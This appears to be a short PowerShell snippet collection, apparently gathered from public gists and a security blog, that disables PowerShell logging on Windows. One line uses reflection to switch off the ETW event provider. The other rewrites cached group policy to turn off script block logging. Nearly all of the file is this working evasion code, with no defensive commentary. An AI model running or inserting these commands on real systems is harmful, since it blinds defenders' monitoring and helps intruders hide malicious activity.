# https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32#file-killetw-ps1
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)

# https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32#file-killetw-ps1
# https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs
# https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
